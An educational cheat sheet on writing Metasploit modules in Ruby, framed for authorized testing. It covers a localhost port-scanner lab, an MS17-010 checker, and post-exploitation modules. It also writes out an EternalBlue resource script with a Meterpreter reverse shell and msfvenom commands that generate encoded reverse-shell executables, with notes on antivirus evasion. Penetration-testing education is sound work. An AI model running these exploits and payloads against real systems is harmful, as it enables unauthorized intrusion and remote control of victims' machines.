# Metasploit Scripting

> **⚠️ AUTHORIZED USE ONLY.** For education and authorized testing only. The modules and payloads you build here run real code against real systems. Use them only against machines you own or that are explicitly in scope. The lab targets a local VM you control. Custom payloads are live malware: keep them off shared drives and delete them when done. See the [Legal and Terms of Use](/legal) page.

> "The best offense is a deep understanding of the tools you use: not just how to run them, but how to write them."

**Scope:** Writing Metasploit modules in Ruby, rather than only running them. Module anatomy, custom auxiliary scanners, a vulnerability checker, automating an exploit with a resource script, post-exploitation modules, and payload generation with encoding. Builds directly on the **Metasploit Basics** and **Ruby Scripting** sheets, which cover the console workflow and the Ruby you need to read first.

**Recommended background:** the Metasploit Basics sheet (msfconsole, the workflow, msfvenom) and the Ruby Scripting sheet (classes, inheritance, methods, exceptions). This sheet assumes both.

## Table of Contents
- [Why Write Modules](#why-write-modules)
- [Where Modules Live](#where-modules-live)
- [The Anatomy of a Module](#the-anatomy-of-a-module)
- [Mixins](#mixins)
- [Options and Datastore](#options-and-datastore)
- [Output Methods](#output-methods)
- [A Custom Auxiliary Scanner](#a-custom-auxiliary-scanner)
- [Lab: Build and Run a Port Scanner Module](#lab-build-and-run-a-port-scanner-module)
- [A Vulnerability Checker](#a-vulnerability-checker)
- [Resource Scripts for Automation](#resource-scripts-for-automation)
- [Post-Exploitation Modules](#post-exploitation-modules)
- [Custom Payloads and Encoding](#custom-payloads-and-encoding)
- [Loading and Debugging Modules](#loading-and-debugging-modules)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

## 1. Why Write Modules

Running Metasploit is a baseline skill. Writing modules is the ceiling.

Every serious engagement eventually meets a target no existing module handles: an unusual service, a fresh vulnerability, a custom check the framework does not ship. The tester who can write a module solves it on the spot instead of waiting for someone else to.

| Running modules | Writing modules |
|-----------------|-----------------|
| Limited to what exists | Adapt to any target |
| Configure and run | Build the logic yourself |
| Consumer of the framework | Contributor to it |

The three capabilities this builds, in order:

- **A custom scanner** teaches how reconnaissance tools work underneath.
- **A vulnerability checker** teaches how detection logic is written from scratch.
- **A custom encoded payload** teaches how evasion works at the code level.

None of this is possible without the Ruby from the scripting sheet, because a Metasploit module is just a Ruby class. If `class Child < Parent` and `super` are unfamiliar, read that sheet first.

## 2. Where Modules Live

Framework modules ship here:

```text
/usr/share/metasploit-framework/modules/
├── auxiliary/     scanners and non-exploit tools
├── exploits/      exploits, by platform
├── payloads/      payload code
├── post/          post-exploitation
├── encoders/      payload encoders
└── nops/          nop generators
```

**Your own modules go in a parallel tree under your home directory**, so a framework update never overwrites them:

```text
~/.msf4/modules/
├── auxiliary/
├── exploits/
└── post/
```

Create the path that matches the module type, then drop your `.rb` file in it:

```bash
mkdir -p ~/.msf4/modules/auxiliary/scanner/custom
```

The folder structure under `~/.msf4/modules/` is what determines the module's path inside msfconsole, so mirror the framework layout.

## 3. The Anatomy of a Module

Every module is a Ruby class inheriting from a framework base. Reading a real one is the fastest way in:

```bash
less /usr/share/metasploit-framework/modules/auxiliary/scanner/portscan/tcp.rb
```

The skeleton of an auxiliary module:

```ruby
class MetasploitModule < Msf::Auxiliary          # inherit the base class

  include Msf::Auxiliary::Scanner                 # mixins add behaviour
  include Msf::Auxiliary::Report

  def initialize(info = {})                       # the constructor
    super(update_info(info,
      'Name'        => 'My Custom Scanner',
      'Description' => 'What this module does',
      'Author'      => ['your handle'],
      'License'     => MSF_LICENSE
    ))

    register_options([                            # options the user can set
      Opt::RPORT(80)
    ])
  end

  def run_host(ip)                                # the actual work
    # code that runs against each target
  end

end
```

| Part | Role |
|------|------|
| `class MetasploitModule < Msf::Auxiliary` | Inherit the auxiliary base class |
| `include ...` | Mixins that add scanning, reporting, and protocol helpers |
| `initialize` | Metadata (name, description, author) and options |
| `super(update_info(...))` | Pass that metadata up to the base class |
| `register_options` | Declare the settings a user configures with `set` |
| `run_host(ip)` | The method the scanner mixin calls once per target |

Every one of those Ruby constructs, inheritance, `super`, hashes, methods, appeared in the Ruby Scripting sheet. This is that language applied.

**The base class you inherit determines the module type:**

| Base class | Module type |
|------------|-------------|
| `Msf::Auxiliary` | Scanner or non-exploit tool |
| `Msf::Exploit::Remote` | Remote exploit |
| `Msf::Post` | Post-exploitation |
| `Msf::Encoder` | Payload encoder |

## 4. Mixins

A **mixin** is a Ruby module you `include` to add ready-made behaviour, so you do not write scanning loops or protocol handling yourself. This is how one module reuses the framework's plumbing.

| Mixin | Adds |
|-------|------|
| `Msf::Auxiliary::Scanner` | The `run_host` loop, `RHOSTS`, and threading |
| `Msf::Auxiliary::Report` | Storing results in the database (`report_host`, `report_service`) |
| `Msf::Exploit::Remote::Tcp` | `connect`, `disconnect`, raw TCP |
| `Msf::Exploit::Remote::HttpClient` | `send_request_cgi` and HTTP helpers |
| `Msf::Exploit::Remote::SMB::Client` | SMB protocol handling |
| `Msf::Post::Windows::Registry` | Reading and writing the Windows registry |

**The Scanner mixin is the important one for this project.** Including it means you write `run_host(ip)` for a single target, and the mixin handles iterating over every host in `RHOSTS`, threading, and progress. You get a multi-target threaded scanner without writing the loop.

```ruby
include Msf::Auxiliary::Scanner

def run_host(ip)
  # this runs once per host in RHOSTS, automatically
end
```

## 5. Options and Datastore

`register_options` declares what a user can configure. Each option type validates its input.

```ruby
register_options([
  Opt::RPORT(445),                                          # a preset remote port
  OptString.new('TARGETURI', [true, 'The path', '/']),      # a string
  OptInt.new('THREADS', [false, 'Threads', 10]),            # an integer
  OptBool.new('VERBOSE', [false, 'Verbose output', false]), # true/false
  OptAddress.new('GATEWAY', [false, 'Gateway IP'])          # an IP address
])
```

Each option takes `[required?, description, default]`. `Opt::RPORT` and `Opt::RHOSTS` are shortcuts for the common ones.

**Reading a value** at runtime uses the datastore, which holds everything the user set:

```ruby
def run_host(ip)
  port    = datastore['RPORT']
  path    = datastore['TARGETURI']
  verbose = datastore['VERBOSE']
end
```

`datastore['NAME']` retrieves whatever the user configured with `set NAME value`. Option names are conventionally uppercase.

## 6. Output Methods

Modules do not use `puts`. The framework provides output methods that respect verbosity settings and log correctly.

| Method | Use for | Appears as |
|--------|---------|------------|
| `print_good` | A positive finding | `[+]` green |
| `print_status` | Normal progress | `[*]` blue |
| `print_error` | A failure | `[-]` red |
| `print_warning` | A caution | `[!]` yellow |
| `vprint_status` | Progress shown only when VERBOSE is on | `[*]` |
| `print_line` | Raw text, no prefix | plain |

```ruby
print_good("#{ip}:#{port} is open")
print_error("#{ip} did not respond")
vprint_status("Trying #{ip}:#{port}")     # quiet unless the user sets VERBOSE
```

Use `vprint_status` for per-attempt noise, so a scan of a thousand ports does not flood the console unless the user asks for detail. That single habit is what separates a usable module from an unusable one.

## 7. A Custom Auxiliary Scanner

Putting the pieces together into a working TCP port scanner, the first objective.

```ruby
class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Simple TCP Port Scanner',
      'Description' => 'Checks whether a TCP port is open',
      'Author'      => ['student'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(80),
      OptInt.new('TIMEOUT', [false, 'Connection timeout in seconds', 2])
    ])
  end

  def run_host(ip)
    port    = datastore['RPORT']
    timeout = datastore['TIMEOUT']

    begin
      sock = ::TCPSocket.new(ip, port)          # try to connect
      print_good("#{ip}:#{port} - open")
      report_service(host: ip, port: port)      # store it in the database
      sock.close
    rescue ::Errno::ECONNREFUSED
      vprint_status("#{ip}:#{port} - closed")
    rescue ::Timeout::Error, ::Errno::ETIMEDOUT
      vprint_status("#{ip}:#{port} - filtered")
    rescue ::StandardError => e
      vprint_error("#{ip}:#{port} - #{e.message}")
    end
  end

end
```

Reading it against the earlier sections:

| Line | From |
|------|------|
| `< Msf::Auxiliary` | Section 3, the auxiliary base |
| `include Msf::Auxiliary::Scanner` | Section 4, gives the multi-host loop |
| `register_options` | Section 5 |
| `datastore['RPORT']` | Section 5, reading the user's value |
| `begin / rescue` | the Ruby exceptions from the scripting sheet |
| `report_service` | Section 4's Report mixin, stores the result |
| `print_good` / `vprint_status` | Section 6 |

The `::` prefix (`::TCPSocket`, `::Errno`) forces Ruby to look at the top level rather than inside the module's namespace, which avoids name clashes. Framework modules do this consistently.

## 8. Lab: Build and Run a Port Scanner Module

**What you are doing:** writing the auxiliary scanner above as a real module file, loading it into msfconsole, and running it against your own machine. This is the core scenario of the whole project.

**Time:** about 20 minutes. **Target:** `127.0.0.1` only.

### Step 1: Create the module path

```bash
mkdir -p ~/.msf4/modules/auxiliary/scanner/custom
cd ~/.msf4/modules/auxiliary/scanner/custom
```

### Step 2: Write the module

Save as `simple_tcp.rb`:

```ruby
class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Simple TCP Port Scanner',
      'Description' => 'Checks whether a TCP port is open',
      'Author'      => ['student'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(80),
      OptInt.new('TIMEOUT', [false, 'Connection timeout in seconds', 2])
    ])
  end

  def run_host(ip)
    port = datastore['RPORT']

    begin
      sock = ::TCPSocket.new(ip, port)
      print_good("#{ip}:#{port} - open")
      report_service(host: ip, port: port)
      sock.close
    rescue ::Errno::ECONNREFUSED
      vprint_status("#{ip}:#{port} - closed")
    rescue ::StandardError => e
      vprint_error("#{ip}:#{port} - #{e.message}")
    end
  end

end
```

### Step 3: Give it something to find

In a second terminal:

```bash
python3 -m http.server 8000
```

### Step 4: Load and run

```bash
msfconsole -q
```

```text
reload_all
use auxiliary/scanner/custom/simple_tcp
info
set RHOSTS 127.0.0.1
set RPORT 8000
run
```

Expected:

```text
[+] 127.0.0.1:8000 - open
[*] Scanned 1 of 1 hosts (100% complete)
```

`reload_all` picks up modules from `~/.msf4/modules/` without restarting the console.

### Step 5: Confirm the database captured it

```text
services
```

Expected: port 8000 on `127.0.0.1`, written by your own module's `report_service` call.

### Step 6: Prove the scanner mixin gave you multi-host for free

```text
set RHOSTS 127.0.0.1 127.0.0.2
run
```

You wrote `run_host` for one host, but the mixin ran it against both. That is the point of Section 4.

### Step 7: See VERBOSE work

```text
set VERBOSE true
set RPORT 9999
run
```

Expected: with a closed port and VERBOSE on, you now see the `closed` line that was hidden before. Turn it off and the noise disappears.

### Cleanup

Stop the HTTP server with `Ctrl-C`. Leave the module in place, it is yours to build on.

## 9. A Vulnerability Checker

The second objective: detecting whether a target is vulnerable, specifically MS17-010 (EternalBlue). A checker reports vulnerability without exploiting, which is safer and often all an assessment needs.

The framework already ships `auxiliary/scanner/smb/smb_ms17_010`. Read it to see production detection logic:

```bash
less /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_ms17_010.rb
```

**How the check actually works, conceptually:** MS17-010 is a flaw in SMBv1. The checker connects to SMB, sends a specific crafted request, and examines the response code. A vulnerable host returns a distinctive error that a patched host does not. The module never exploits anything; it fingerprints the response.

The shape of a checker built on the SMB mixin:

```ruby
class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'MS17-010 Checker',
      'Description' => 'Checks for the MS17-010 SMBv1 vulnerability',
      'Author'      => ['student'],
      'License'     => MSF_LICENSE
    ))
    register_options([ Opt::RPORT(445) ])
  end

  def run_host(ip)
    begin
      connect                                   # from the SMB mixin
      # negotiate SMB, send the probe, inspect the response status
      if vulnerable_response?                   # your detection logic
        print_good("#{ip} - VULNERABLE to MS17-010")
        report_vuln(host: ip, name: "MS17-010")
      else
        print_status("#{ip} - patched or not SMBv1")
      end
    rescue ::StandardError => e
      vprint_error("#{ip} - #{e.message}")
    ensure
      disconnect
    end
  end

end
```

**The pattern for any vulnerability checker** is the same three steps: connect, send a probe that behaves differently on vulnerable versus patched systems, and read the response to decide. `check` methods in exploit modules do exactly this, which is why `check` is safe to run when `exploit` is not.

Using the shipped checker to see it work:

```text
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <your test VM>
run
```

## 10. Resource Scripts for Automation

The third objective: automating a full exploit and payload sequence. A **resource script** is a text file of msfconsole commands run in order, which is the simplest form of Metasploit automation.

```text
# save as exploit.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit -j
```

Run it:

```bash
msfconsole -q -r exploit.rc
```

Or from inside the console:

```text
resource exploit.rc
```

**Capturing what you did as a script:** msfconsole records your commands, and `makerc` writes them to a file, so you can perform an exploit once by hand then replay it.

```text
makerc ~/my_engagement.rc
```

Resource scripts can also embed Ruby for logic the plain command list cannot express, wrapped in `<ruby>` tags:

```text
<ruby>
framework.hosts.each do |host|
  print_status("Known host: #{host.address}")
end
</ruby>
```

That is the boundary between a resource script and a module: a resource script chains commands and can drop into Ruby for glue, while a module is a full Ruby class with proper structure. Reach for a resource script to automate a repeatable sequence, and a module when you are building a reusable tool.

## 11. Post-Exploitation Modules

The fourth objective: gathering system information after access. A **post module** runs against an existing session rather than a network target, so it inherits from `Msf::Post` and receives the session automatically.

The framework ships many. The common ones:

```text
post/windows/gather/enum_logged_on_users
post/windows/gather/hashdump
post/windows/gather/checkvm
post/multi/gather/env
post/linux/gather/enum_system
```

Running one against a session:

```text
sessions                              list sessions
use post/windows/gather/enum_system
set SESSION 1
run
```

The shape of a post module:

```ruby
class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Gather Basic Info',
      'Description' => 'Collects OS and user details',
      'Author'      => ['student'],
      'License'     => MSF_LICENSE,
      'Platform'    => ['windows'],
      'SessionTypes'=> ['meterpreter']
    ))
  end

  def run
    print_status("Running against session #{session.sid}")
    print_good("OS: #{sysinfo['OS']}")
    print_good("Computer: #{sysinfo['Computer']}")
    print_good("User: #{session.sys.config.getuid}")

    # store what you gathered
    loot = store_loot("host.info", "text/plain", session, sysinfo.to_s)
    print_good("Saved to #{loot}")
  end

end
```

| Difference from an auxiliary module | Why |
|-------------------------------------|-----|
| Inherits `Msf::Post` | It works on a session, not a network host |
| `run`, not `run_host` | There is one session, not a range of hosts |
| `session.sys.config.getuid` | The session object is available directly |
| `SessionTypes` in metadata | Declares it needs a Meterpreter session |
| `store_loot` | Post modules commonly save what they collect |

`sysinfo` and the `session` object are what a post module reads instead of connecting over the network. Everything it needs is already in the established session.

## 12. Custom Payloads and Encoding

The fifth objective: generating and encoding a payload to evade antivirus. This uses `msfvenom` from the Basics sheet, applied with intent.

### Generating

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.5 LPORT=4444 \
         -f exe -o payload.exe
```

### Encoding

An **encoder** rewrites the payload's bytes while preserving what it does. `-e` selects one, `-i` sets how many times to apply it.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.5 LPORT=4444 \
         -e x64/xor_dynamic -i 5 \
         -f exe -o encoded.exe
```

### The honest truth about evasion

The objective frames this as antivirus evasion, so here is the reality a professional needs to state plainly:

**Encoders were never designed to defeat antivirus, and they do not.** Their original purpose is removing bad characters, bytes a target cannot accept, such as null bytes in a buffer overflow. `shikata_ga_nai`, the famous one, is a polymorphic encoder, but its output has been signatured by every serious antivirus for years. Encoding a stock Meterpreter payload and expecting it to slip past modern endpoint protection does not work.

What actually evades detection in current practice:

| Technique | Why it works better |
|-----------|--------------------|
| **Custom payloads** | Code with no known signature, written for the engagement |
| **Packers and crypters** | Encrypt the payload, decrypt only in memory at runtime |
| **Living off the land** | Use the target's own trusted tools instead of a dropped binary |
| **Staged loaders** | Fetch the real payload only after landing, so the file on disk is benign |

**Test your own output rather than trusting a reputation:**

```bash
# check the raw payload's byte-level signature locally
# (submitting to online scanners shares your payload with vendors)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
         -f exe -o test.exe
```

Do not upload payloads to VirusTotal. It distributes your sample to antivirus vendors, who then signature it, which burns it for a real engagement. Test locally against the specific product in scope.

The learning objective is worth reaching past its own framing: **understanding that encoding is not evasion is more valuable than any encoder flag.** Believing a `shikata_ga_nai` payload is stealthy is exactly the mistake that gets a red team caught.

## 13. Loading and Debugging Modules

### Loading

```text
reload_all                    reload every module from disk
loadpath ~/.msf4/modules      add a module path for this session
```

`reload_all` after every edit. It re-reads your file so you can iterate without restarting.

### When a module will not load

A Ruby syntax error stops the module loading, usually silently. Check the file with Ruby directly before blaming Metasploit:

```bash
ruby -c ~/.msf4/modules/auxiliary/scanner/custom/simple_tcp.rb
```

`-c` checks syntax without running. `Syntax OK` means the problem is elsewhere; an error names the line.

### Debugging a loaded module

| Command | Use |
|---------|-----|
| `reload_all` | Reload after an edit |
| `info` | Confirm metadata and options parsed correctly |
| `show options` | Check options registered as intended |
| `set VERBOSE true` | Surface `vprint_` output while testing |
| `irb` (inside a session) | Drop into Ruby to inspect objects live |

Add `print_status` lines while developing to see where execution reaches, then switch them to `vprint_status` once it works, so they are quiet by default.

**The iteration loop:** edit the file, `ruby -c` it, `reload_all`, `run`, read the output, repeat. Keeping that loop tight is most of what module development feels like.

## 14. Fast Recall

- **A Metasploit module is a Ruby class** inheriting from a framework base. The base class sets the type: `Msf::Auxiliary`, `Msf::Exploit::Remote`, `Msf::Post`.
- **Your modules go in `~/.msf4/modules/`**, mirroring the framework's folder layout, which sets their path in the console.
- **`initialize`** holds metadata and `register_options`; **`super(update_info(...))`** passes it up.
- **Mixins add behaviour.** `Msf::Auxiliary::Scanner` gives you the multi-host threaded loop, so you only write `run_host(ip)` for one target.
- **`register_options`** declares settings: `OptString`, `OptInt`, `OptBool`, `OptAddress`, `Opt::RPORT`. Each takes `[required?, description, default]`.
- **Read a user's value** with `datastore['NAME']`.
- **Output methods, not `puts`:** `print_good` `[+]`, `print_status` `[*]`, `print_error` `[-]`, and `vprint_` versions that show only under VERBOSE.
- **A scanner's work goes in `run_host(ip)`**, which the Scanner mixin calls once per host in RHOSTS.
- **`report_service` and `report_vuln`** store findings in the database, from the Report mixin.
- **`::` prefix** (`::TCPSocket`) forces the top-level namespace, avoiding clashes.
- **A vulnerability checker** connects, sends a probe that behaves differently on vulnerable versus patched hosts, and reads the response. It never exploits, which is why `check` is safe when `exploit` is not.
- **Resource scripts** (`.rc`) chain console commands: run with `-r file.rc` or `resource file.rc`. **`makerc`** records what you did into one.
- **Resource scripts can embed Ruby** in `<ruby>` tags for glue logic.
- **Post modules** inherit `Msf::Post`, define `run` not `run_host`, and read the `session` object directly. `store_loot` saves what they gather.
- **Encoders (`-e`, `-i`) are not antivirus evasion.** They remove bad characters. `shikata_ga_nai` is fully signatured. Real evasion is custom code, crypters, and living off the land.
- **Never upload payloads to VirusTotal**, it shares them with vendors and burns them. Test locally.
- **`reload_all`** after every edit. **`ruby -c file.rb`** catches the syntax error stopping a module from loading.

## 15. Resources

**Module development**
- [Metasploit module development docs](https://docs.metasploit.com/docs/development/developing-modules/get-started-writing-an-exploit.html)
- [Metasploit Framework source (read real modules)](https://github.com/rapid7/metasploit-framework/tree/master/modules)
- [Metasploit Developer Documentation](https://docs.metasploit.com/api/)
- [Metasploit Unleashed: writing modules](https://www.offsec.com/metasploit-unleashed/building-module/)

**Resource scripts and automation**
- [Metasploit resource scripts](https://docs.metasploit.com/docs/using-metasploit/basics/running-resource-scripts.html)

**Payloads and encoding**
- [msfvenom documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)

**Related sheets**
- Metasploit Basics, for the console workflow this builds on
- Ruby Scripting, for the language every module is written in

**Practice (authorized labs)**
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
- [TryHackMe](https://tryhackme.com/)
- [Hack The Box](https://www.hackthebox.com/)
